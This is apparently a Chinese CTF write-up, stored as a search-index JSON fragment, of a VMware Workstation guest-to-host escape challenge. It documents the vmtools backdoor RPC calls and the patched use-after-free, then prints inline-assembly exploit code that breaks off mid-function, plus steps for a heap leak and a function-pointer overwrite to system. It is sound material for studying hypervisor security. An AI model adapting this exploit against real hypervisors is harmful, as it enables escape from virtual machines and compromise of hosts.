2018\u662f\u6211\u4eec\u89c9\u5f97\u975e\u5e38\u4e0d\u9519\u7684\u4e00\u6b21\u7ade\u8d5b\uff0c\u975e\u5e38\u8d34\u8fd1\u5b9e\u6218\uff0c\u5176\u4e2d\u6bcf\u9053\u9898\u76ee\u90fd\u503c\u5f97\u6df1\u5165\u7814\u7a76\u3002\u5176\u4e2dStation-Escape\u662f\u4e00\u9053VMWare Workstation\u9003\u9038\u7684\u9898\u76ee\uff0c\u6211\u4eec\u89c9\u5f97\u975e\u5e38cool\uff0c\u6240\u4ee5\u8fdb\u884c\u4e86\u8be6\u7ec6\u5206\u6790\uff0c\u8fd9\u91cc\u975e\u5e38\u611f\u8c22\u957f\u4ead\u79d1\u6280\u7684flyyy\u5e08\u5085\u8d21\u732e\u7684\u975e\u5e38\u4f18\u79c0\u7684\u9898\u76ee\u548c\u6089\u5fc3\u7684\u6280\u672f\u6307\u5bfc\u3002\u672c\u6587\u5206\u6790\u5de5\u4f5c\u7531r3kapig\u7684Ne0\u548cbibi\u5b8c\u6210\u3002","title":"RealWorldCTF Final Station-Escape Writeup"},{"location":"backup/realworldctf_2018_stationescape/#_1","text":"\u5728VMWare\u4e2d\uff0c\u6709\u4e00\u4e2a\u5947\u7279\u7684\u653b\u51fb\u9762\uff0c\u5c31\u662fvmtools\u3002vmtools\u5e2e\u52a9\u5bbf\u4e3b\u673a\u548c\u5ba2\u6237\u673a\u5b8c\u6210\u5305\u62ec\u6587\u4ef6\u4f20\u8f93\u5728\u5185\u7684\u4e00\u7cfb\u5217\u7684\u901a\u4fe1\u548c\u4ea4\u4e92\uff0c\u5176\u4e2d\u4f7f\u7528\u4e86\u4e00\u79cd\u88ab\u79f0\u4e3abackdoor\u7684\u63a5\u53e3\u3002backdoor\u63a5\u53e3\u662f\u5982\u4f55\u548c\u5bbf\u4e3b\u673a\u8fdb\u884c\u901a\u4fe1\u7684\u5462\uff0c\u6211\u4eec\u89c2\u5bdfbackdoor\u51fd\u6570\u7684\u5b9e\u73b0\uff0c\u53ef\u4ee5\u53d1\u73b0\u5982\u4e0b\u4ee3\u7801\uff1a MOV EAX , 564 D5868h /* magic number */ MOV EBX , command - specific - parameter MOV CX , backdoor - command - number MOV DX , 5658 h /* VMware I/O Port */ IN EAX , DX ( or OUT DX , EAX ) \u9996\u5148\u9700\u8981\u660e\u786e\u7684\u662f\uff0c\u8be5\u63a5\u53e3\u5728\u7528\u6237\u6001\u5c31\u53ef\u4ee5\u4f7f\u7528\u3002\u5728\u901a\u5e38\u73af\u5883\u4e0b\uff0cIN\u6307\u4ee4\u662f\u4e00\u6761\u7279\u6743\u6307\u4ee4\uff0c\u5728\u666e\u901a\u7528\u6237\u6001\u7a0b\u5e8f\u4e0b\u662f\u65e0\u6cd5\u4f7f\u7528\u7684\u3002\u56e0\u6b64\uff0c\u8fd0\u884c\u8fd9\u6761\u6307\u4ee4\u4f1a\u8ba9\u7528\u6237\u6001\u7a0b\u5e8f\u51fa\u9519\u5e76\u9677\u51fa\u5230hypervisor\u5c42\uff0c\u4ece\u800chypervisor\u5c42\u53ef\u4ee5\u5bf9\u5ba2\u6237\u673a\u8fdb\u884c\u76f8\u5173\u7684\u64cd\u4f5c\u548c\u5904\u7406\uff0c\u56e0\u6b64\u5229\u7528\u6b64\u673a\u5236\u5b8c\u6210\u4e86\u901a\u4fe1\u3002\u5229\u7528backdoor\u7684\u901a\u4fe1\u673a\u5236\uff0c\u5ba2\u6237\u673a\u4fbf\u53ef\u4ee5\u4f7f\u7528RPC\u8fdb\u884c\u4e00\u7cfb\u5217\u7684\u64cd\u4f5c\uff0c\u4f8b\u5982\u62d6\u653e\u3001\u590d\u5236\u3001\u83b7\u53d6\u4fe1\u606f\u3001\u53d1\u9001\u4fe1\u606f\u7b49\u7b49\u3002 backdoor\u673a\u5236\u6240\u6709\u7684\u547d\u4ee4\u548c\u8c03\u7528\u65b9\u6cd5\uff0c\u57fa\u672c\u90fd\u662f\u9996\u5148\u8bbe\u7f6e\u5bc4\u5b58\u5668\u3001\u7136\u540e\u8c03\u7528IN\u6216OUT\u7279\u6743\u6307\u4ee4\u7684\u6a21\u5f0f\u3002\u90a3\u4e48\u6211\u4eec\u4f7f\u7528backdoor\u4f20\u8f93RPC\u6307\u4ee4\u9700\u8981\u7ecf\u8fc7\u54ea\u4e9b\u6b65\u9aa4\u5462\uff1f\u6211\u4eec\u4ee5\u672c\u9898\u6d89\u53ca\u5230\u7684backdoor\u64cd\u4f5c\u8fdb\u884c\u8bf4\u660e\uff1a +------------------+ | Open RPC channel | +---------+--------+ | +------------ v -----------+ | Send RPC command length | +------------+-----------+ | +------------ v -----------+ | Send RPC command data | +------------+-----------+ | +------------- v ------------+ | Recieve RPC reply length | +-------------+------------+ | +------------ v -----------+ | Receive RPC reply data | +------------+-----------+ | +-------------- v -------------+ | Finish receiving RPC reply | +--------------+-------------+ | +--------- v ---------+ | Close RPC channel | +-------------------+ \u4ee5\u4e0b\u5185\u5bb9\u4e3b\u8981\u53c2\u8003\uff08\u8be5\u6587\u6863\u548c\u771f\u5b9e\u9006\u5411\u60c5\u51b5\u7565\u6709\u51fa\u5165\uff0c\u5c06\u4f1a\u5728\u540e\u6587\u4e2d\u8bf4\u660e\uff09\uff1a https://sites.google.com/site/chitchatvmback/backdoor","title":"\u524d\u7f6e\u77e5\u8bc6"},{"location":"backup/realworldctf_2018_stationescape/#open-rpc-channel","text":"RPC subcommand\uff1a00h \u8c03\u7528IN\uff08OUT\uff09\u524d\uff0c\u9700\u8981\u8bbe\u7f6e\u7684\u5bc4\u5b58\u5668\u5185\u5bb9\uff1a EAX = 564 D5868h - magic number EBX = 49435052 h - RPC open magic number ( RPCI ) ECX ( HI ) = 0000 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a ECX = 00010000 h : success / 00000000 h : failure EDX ( HI ) = RPC channel number \u8be5\u529f\u80fd\u7528\u4e8e\u6253\u5f00RPC\u7684channel\uff0c\u5176\u4e2dECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\uff0cEDX\u8fd4\u56de\u503c\u4f1a\u8fd4\u56de\u4e00\u4e2achannel\u7684\u7f16\u53f7\uff0c\u5728\u540e\u7eed\u7684RPC\u901a\u4fe1\u4e2d\uff0c\u5c06\u4f7f\u7528\u8be5\u7f16\u53f7\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5728\u5355\u4e2a\u865a\u62df\u673a\u4e2d\u53ea\u80fd\u540c\u65f6\u4f7f\u75288\u4e2achannel\uff08 #0 - #7 \uff09,\u5f53\u5c1d\u8bd5\u6253\u5f00\u7b2c9\u4e2achannel\u7684\u65f6\u5019\uff0c\u4f1a\u68c0\u67e5\u5176\u4ed6channel\u7684\u6253\u5f00\u65f6\u95f4\uff0c\u5982\u679c\u65f6\u95f4\u8fc7\u4e86\u67d0\u4e00\u4e2a\u503c\uff0c\u4f1a\u5c06\u8d85\u65f6\u7684channel\u5173\u95ed\uff0c\u518d\u628a\u8fd9\u4e2achannel\u7684\u7f16\u53f7\u8fd4\u56de\uff1b\u5982\u679c\u90fd\u6ca1\u6709\u8d85\u65f6\uff0ccreate channel\u4f1a\u5931\u8d25\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b\u51fd\u6570\u5b9e\u73b0Open RPC channel\u7684\u8fc7\u7a0b\uff1a void channel_open ( int * cookie1 , int * cookie2 , int * channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rdi,%%r10 \\n\\t movq %%rsi,%%r11 \\n\\t movq %%rdx,%%r12 \\n\\t movq %%rcx,%%r13 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0xc9435052,%%ebx \\n\\t movl $0x1e,%%ecx \\n\\t movl $0x5658,%%edx \\n\\t out %%eax,%%dx \\n\\t movl %%edi,(%%r10) \\n\\t movl %%esi,(%%r11) \\n\\t movl %%edx,(%%r12) \\n\\t movl %%ecx,(%%r13) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r8 , %r10 , %r11 , %r12 , %r13 ); }","title":"Open RPC channel"},{"location":"backup/realworldctf_2018_stationescape/#send-rpc-command-length","text":"RPC subcommand\uff1a01h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = command length ( not including the terminating NULL ) ECX ( HI ) = 0001 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a ECX = 00 810000 h : success / 00000000 h : failure \u5728\u53d1\u9001RPC command\u524d\uff0c\u9700\u8981\u5148\u53d1\u9001RPC command\u7684\u957f\u5ea6\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6b64\u65f6\u6211\u4eec\u8f93\u5165\u7684channel number\u6240\u6307\u5411\u7684channel\u5fc5\u987b\u5904\u4e8e\u5df2\u7ecfopen\u7684\u72b6\u6001\u3002ECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\u53d1\u9001\u3002\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a void channel_set_len ( int cookie1 , int cookie2 , int channel_num , int len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movl %%ecx,%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0001001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); }","title":"Send RPC command length"},{"location":"backup/realworldctf_2018_stationescape/#send-rpc-command-data","text":"RPC subcommand\uff1a02h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = 4 bytes from the command data ( the first byte in LSB ) ECX ( HI ) = 0002 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c: ECX = 000010000 h : success / 00000000 h : failure \u8be5\u529f\u80fd\u5fc5\u987b\u5728Send RPC command length\u540e\u4f7f\u7528,\u6bcf\u6b21\u53ea\u80fd\u53d1\u90014\u4e2a\u5b57\u8282\u3002\u4f8b\u5982\uff0c\u5982\u679c\u8981\u53d1\u9001\u547d\u4ee4 machine.id.get \uff0c\u90a3\u4e48\u5fc5\u987b\u8981\u8c03\u75284\u6b21\uff0c\u5206\u522b\u4e3a\uff1a EBX set to 6863616 Dh ( mach ) EBX set to 2E656 E69h ( ine. ) EBX set to 672E6469 h ( id.g ) EBX set to 00007465 h ( et \\x00\\x00 ) ECX\u4f1a\u8fd4\u56de\u662f\u5426\u6210\u529f\uff0c\u5177\u4f53\u5b9e\u73b0\u5982\u4e0b\uff1a void channel_send_data ( int cookie1 , int cookie2 , int channel_num , int len , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $0,%%r12 \\n\\t 1: \\n\\t movq %%r8,%%rbp \\n\\t add %%r12,%%rbp \\n\\t movl (%%rbp),%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0002001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t addq $4,%%r12 \\n\\t cmpq %%r12,%%r11 \\n\\t ja 1b \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); }","title":"Send RPC command data"},{"location":"backup/realworldctf_2018_stationescape/#recieve-rpc-reply-length","text":"RPC subcommand\uff1a03h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number ECX ( HI ) = 0003 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\u503c\uff1a EBX = reply length ( not including the terminating NULL ) ECX = 00 830000 h : success / 00000000 h : failure \u63a5\u6536RPC reply\u7684\u957f\u5ea6\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\u6240\u6709\u7684RPC command\u90fd\u4f1a\u8fd4\u56de\u81f3\u5c112\u4e2a\u5b57\u8282\u7684reply\u7684\u6570\u636e\uff0c\u5176\u4e2d 1 \u8868\u793a success , 0 \u8868\u793a failure \uff0c\u5373\u4f7fVMware\u65e0\u6cd5\u8bc6\u522bRPC command\uff0c\u4e5f\u4f1a\u8fd4\u56de 0 Unknown command \u4f5c\u4e3areply\u3002\u4e5f\u5c31\u662f\u8bf4\uff0creply\u6570\u636e\u7684\u524d\u4e24\u4e2a\u5b57\u8282\u59cb\u7ec8\u8868\u793aRPC command\u547d\u4ee4\u7684\u72b6\u6001\u3002 void channel_recv_reply_len ( int cookie1 , int cookie2 , int channel_num , int * len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movq %%rcx,%%r11 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0003001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t movl %%ebx,(%%r11) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 ); }","title":"Recieve RPC reply length"},{"location":"backup/realworldctf_2018_stationescape/#receive-rpc-reply-data","text":"RPC subcommand\uff1a04h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = reply type from subcommand 03 h ECX ( HI ) = 0004 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a EBX = 4 bytes from the reply data ( the first byte in LSB ) ECX = 00010000 h : success / 00000000 h : failure \u548c https://sites.google.com/site/chitchatvmback/backdoor \u4e2d\u6709\u51fa\u5165\u7684\u662f\uff0c\u5728\u5b9e\u9645\u7684\u9006\u5411\u5206\u6790\u4e2d\uff0cEBX\u4e2d\u5b58\u653e\u7684\u503c\uff0c\u4e0d\u662freply id\uff0c\u800c\u662freply type\uff0c\u4ed6\u51b3\u5b9a\u4e86\u6267\u884c\u7684\u8def\u5f84\u3002\u548c\u53d1\u9001\u6570\u636e\u4e00\u6837\uff0c\u6bcf\u6b21\u53ea\u80fd\u591f\u63a5\u53d74\u4e2a\u5b57\u8282\u7684\u6570\u636e\u3002\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6211\u4eec\u5728 Recieve RPC reply length \u4e2d\u63d0\u5230\u8fc7\uff0c\u5e94\u7b54\u6570\u636e\u7684\u524d\u4e24\u4e2a\u5b57\u8282\u59cb\u7ec8\u8868\u793aRPC command\u7684\u72b6\u6001\u3002\u4e3e\u4f8b\u8bf4\u660e\uff0c\u5982\u679c\u6211\u4eec\u4f7f\u7528RPC command\u8be2\u95ee machine.id.get \uff0c\u5982\u679c\u6210\u529f\u7684\u8bdd\uff0c\u4f1a\u8fd4\u56de 1 virtual machine id \uff0c\u5426\u5219\u4e3a 0 No machine id \u3002 void channel_recv_data ( int cookie1 , int cookie2 , int channel_num , int offset , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0004001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t in %%dx,%%eax \\n\\t add %%r11,%%rbp \\n\\t movl %%ebx,(%%rbp) \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); }","title":"Receive RPC reply data"},{"location":"backup/realworldctf_2018_stationescape/#finish-receiving-rpc-reply","text":"RPC subcommand\uff1a05h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number EBX = reply type from subcommand 03 h ECX ( HI ) = 0005 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a ECX = 00010000 h : success / 00000000 h : failure \u548c\u524d\u6587\u6240\u8ff0\u4e00\u6837\uff0c\u5728EBX\u4e2d\u5b58\u50a8\u7684\u662freply type\u3002\u5728\u63a5\u6536\u5b8creply\u7684\u6570\u636e\u540e\uff0c\u8c03\u7528\u6b64\u547d\u4ee4\u3002\u5982\u679c\u6ca1\u6709\u901a\u8fc7 Receive RPC reply data \u63a5\u6536\u5b8c\u6574\u4e2areply\u6570\u636e\u7684\u8bdd\uff0c\u5c31\u4f1a\u8fd4\u56defailure\u3002 void channel_recv_finish ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); }","title":"Finish receiving RPC reply"},{"location":"backup/realworldctf_2018_stationescape/#close-rpc-channel","text":"RPC subcommand\uff1a06h \u8c03\u7528\uff1a EAX = 564 D5868h - magic number ECX ( HI ) = 0006 h - subcommand number ECX ( LO ) = 001 Eh - command number EDX ( HI ) = channel number EDX ( LO ) = 5658 h - port number \u8fd4\u56de\uff1a ECX = 00010000 h : success / 00000000 h : failure \u5173\u95edchannel\u3002 void channel_close ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0006001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); }","title":"Close RPC channel"},{"location":"backup/realworldctf_2018_stationescape/#_2","text":"\u867d\u7136\u662fRealWorld\u7684\u7ade\u8d5b\uff0c\u4f46\u662f\u56e0\u4e3a\u662f\u9b54\u6539\u7684VMWare Workstation\uff0c\u56e0\u6b64\u6211\u4eec\u901a\u8fc7\u4e8c\u8fdb\u5236\u6bd4\u5bf9\u7684\u65b9\u5f0f\u53ef\u4ee5\u5feb\u901f\u5b9a\u4f4d\u5230\u6f0f\u6d1e\u70b9\uff0c\u8282\u7701\u5927\u91cf\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u5ba1\u8ba1\u548c\u6f0f\u6d1e\u6316\u6398\u7684\u65f6\u95f4\u3002 \u53ef\u4ee5\u53d1\u73b0\u51fa\u9898\u4eba\u4ec5\u4ec5\u4fee\u6539\u4e86\u4e24\u5904\uff0c\u4e00\u5904\u57280x1893c9\uff0c\u53e6\u4e00\u5904\u57280x1893e6\u3002\u5206\u522b\u5bf9\u4e24\u4e2a\u4f4d\u7f6e\u8fdb\u884c\u5206\u6790\uff1a \u9996\u5148\u57280x1893c9\u5904\uff0cchannel- out_msg_buf\u7f6enull\u7684\u64cd\u4f5c\u88abnop\u6389\u4e86\uff1a \u5176\u6b21\u57280x1893e6\u5904\u7684\u51fd\u6570\u8c03\u7528\u4e2d\uff0cv7 1\u53d8\u6210\u4e86v7 0x21\uff1a \u5728\u7b2c\u4e00\u5904patch\u4e2d\uff0cout_msg_buf\u6ca1\u6709\u88ab\u7f6e\u7a7a\uff0c\u5176\u6b21\u5728\u7b2c\u4e8c\u5904patch\u4e2d\uff0c\u539f\u5148\u88ab\u9650\u5236\u7684reply type( 0x1)\u53d8\u6210\u4e86 0x21,\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u5728Finish receiving RPC reply\u7684reply type\u4e2d\u53ef\u4ee5\u8bbe\u7f6e\u53e6\u5916\u4e00\u6761\u8def\u5f84\uff0c\u8fd9\u6761\u8def\u5f84\u4f1a\u5bfc\u81f4\u5728\u968f\u540e\u7684 v6 \u8fd9\u4e2a\u8c03\u7528(\u5b83\u4f1acall\u51fd\u6570 sub_177700 )\uff0c output buffer \u88ab free \u6389\u3002 void channel_recv_finish2 ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x21,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); }","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"backup/realworldctf_2018_stationescape/#_3","text":"\u7531\u4e0a\u9762\u7684\u5206\u6790\u53ef\u4ee5\u77e5\uff0c\u8fd9\u4e2apatch\u4f1a\u5bfc\u81f4 UAF :\u5982\u679c\u6211\u4eec\u5728\u63a5\u6536\u5b8c\u6210\u4e4b\u540e\u8bbe\u7f6e\u4e86 0x20 \u8fd9\u4e2a\u4f4d\uff0c\u90a3\u4e48 output buffer \u5c31\u4f1a\u88ab\u91ca\u653e\u6389\uff0c\u4f46\u7531\u4e8e\u5b83\u6ca1\u6709\u88ab\u6e05\u96f6\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a\u6211\u4eec\u53ef\u4ee5\u65e0\u9650\u6b21\u7684\u5c06\u5b83 free \u6389\u3002\u6709\u4e86\u8fd9\u4e9b\u6761\u4ef6\uff0c\u6211\u4eec\u8981\u5b8c\u6210\u6574\u4e2a\u5229\u7528\u5c31\u4e0d\u96be\u4e86\u3002 \u5229\u7528\u6b65\u9aa4\u5982\u4e0b: Leak: 1. \u5f00\u4e24\u4e2a channel:A\uff0cB 2. A \u7684 output buffer \u4e3a buf_A ,\u7136\u540e A \u91ca\u653e buf_A 3. \u8fd9\u65f6\u8ba9 B \u51c6\u5907\u7ed9 guest \u53d1 output , B \u4f1a\u5206\u914d\u4e00\u4e2a buffer \uff0c\u6211\u4eec\u5229\u7528 info-set \u548c info-get \u6765\u63a7\u5236\u6211\u4eec\u5206\u914d\u7684 buffer \u5927\u5c0f\uff0c\u4f7f\u5f97 B \u7684 output buffer: buf_B=buf_A \u3002 4. A \u518d\u6b21\u91ca\u653e buf_A \uff0c\u8fd9\u4e5f\u5bfc\u81f4\u4e86 buf_B \u88ab\u91ca\u653e\u3002\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5 leak \u51fa buf_B \u7684 fd \u4e86,\u4f46\u662f\u8fd9\u4e2a\u6307\u9488\u6ca1\u6709\u4ec0\u4e48\u7528\uff0c\u6211\u4eec\u60f3\u8981\u7684\u662f text base \u3002 5. \u56e0\u6b64\u6211\u4eec\u518d\u6267\u884c\u547d\u4ee4 vmx.capability.dnd_version ,\u8fd9\u4f1a\u8ba9 host \u5206\u914d\u4e00\u5757\u5185\u5b58\u6765\u5b58\u653e\u4e00\u4e2a obj ,\u901a\u8fc7\u63a7\u5236 buffer \u5927\u5c0f\u6211\u4eec\u53ef\u4ee5\u521a\u597d\u8ba9 buf_B \u88ab\u7528\u6765\u5b58\u653e\u4e00\u4e2a obj \u3002\u800c\u8fd9\u4e2a obj \u91cc\u9762\u6709 vtable ,\u6211\u4eec\u53ef\u4ee5 leak \u51fa\u6765\u8ba1\u7b97 text base \u3002\u6ce8\u610f\u6211\u4eec\u4e00\u76f4\u6ca1\u6709\u63a5\u53d7 B \u7684\u8f93\u51fa\uff0c\u53ea\u662f\u8ba9\u5b83\u505a\u597d\u51c6\u5907(\u5206\u914doutput buffer)\u3002\u76f4\u5230\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u624d\u63a5\u53d7\u5b83\u7684\u8f93\u51fa\uff0c\u5b8c\u6210 leak Exploit \u6709\u4e86 leak \u7684\u65b9\u6cd5\uff0c exploit \u7684\u4e5f\u662f\u7c7b\u4f3c\u7684\u4e86\u3002\u7b80\u5355\u6765\u8bf4\u5c31\u662f UAF \uff0c\u628a tcache \u7684 fd \u6539\u5230 bss \u6bb5\uff0c\u7136\u540e\u6539\u51fd\u6570\u6307\u9488\u4e3a system ,\u6700\u540e\u5f39 calculator \u6211\u7ed9\u4f5c\u8005\u7684exp\u52a0\u4e0a\u4e86\u6ce8\u91ca\uff0c\u5927\u5bb6\u53ef\u4ee5\u53c2\u8003: #include stdio.h #include stdint.h void channel_open ( int * cookie1 , int * cookie2 , int * channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rdi,%%r10 \\n\\t movq %%rsi,%%r11 \\n\\t movq %%rdx,%%r12 \\n\\t movq %%rcx,%%r13 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0xc9435052,%%ebx \\n\\t movl $0x1e,%%ecx \\n\\t movl $0x5658,%%edx \\n\\t out %%eax,%%dx \\n\\t movl %%edi,(%%r10) \\n\\t movl %%esi,(%%r11) \\n\\t movl %%edx,(%%r12) \\n\\t movl %%ecx,(%%r13) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r8 , %r10 , %r11 , %r12 , %r13 ); } void channel_set_len ( int cookie1 , int cookie2 , int channel_num , int len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movl %%ecx,%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0001001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_send_data ( int cookie1 , int cookie2 , int channel_num , int len , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $0,%%r12 \\n\\t 1: \\n\\t movq %%r8,%%rbp \\n\\t add %%r12,%%rbp \\n\\t movl (%%rbp),%%ebx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0002001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t addq $4,%%r12 \\n\\t cmpq %%r12,%%r11 \\n\\t ja 1b \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } void channel_recv_reply_len ( int cookie1 , int cookie2 , int channel_num , int * len , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%r8,%%r10 \\n\\t movq %%rcx,%%r11 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0003001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t movl %%ebx,(%%r11) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 ); } void channel_recv_data ( int cookie1 , int cookie2 , int channel_num , int offset , char * data , int * res ){ asm ( pushq %%rbp \\n\\t movq %%r9,%%r10 \\n\\t movq %%r8,%%rbp \\n\\t movq %%rcx,%%r11 \\n\\t movq $1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0004001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t in %%dx,%%eax \\n\\t add %%r11,%%rbp \\n\\t movl %%ebx,(%%rbp) \\n\\t movl %%ecx,(%%r10) \\n\\t popq %%rbp \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 , %r11 , %r12 ); } void channel_recv_finish ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x1,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_recv_finish2 ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movq $0x21,%%rbx \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0005001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } void channel_close ( int cookie1 , int cookie2 , int channel_num , int * res ){ asm ( movl %%eax,%%ebx \\n\\t movq %%rcx,%%r10 \\n\\t movl $0x564d5868,%%eax \\n\\t movl $0x0006001e,%%ecx \\n\\t movw $0x5658,%%dx \\n\\t out %%eax,%%dx \\n\\t movl %%ecx,(%%r10) \\n\\t : : : %rax , %rbx , %rcx , %rdx , %rsi , %rdi , %r10 ); } struct channel { int cookie1 ; int cookie2 ; int num ; }; uint64_t heap = 0 ; uint64_t text = 0 ; void run_cmd ( char * cmd ){ struct channel tmp ; int res , len , i ; char * data ; channel_open ( tmp . cookie1 , tmp . cookie2 , tmp . num , res ); if ( ! res ){ printf ( fail to open channel! \\n ); return ; } channel_set_len ( tmp . cookie1 , tmp . cookie2 , tmp . num , strlen ( cmd ), res ); if ( ! res ){ printf ( fail to set len \\n ); return ; } channel_send_data ( tmp . cookie1 , tmp . cookie2 , tmp . num , strlen ( cmd ) + 0x10 , cmd , res ); channel_recv_reply_len ( tmp . cookie1 , tmp . cookie2 , tmp . num , len , res ); if ( ! res ){ printf 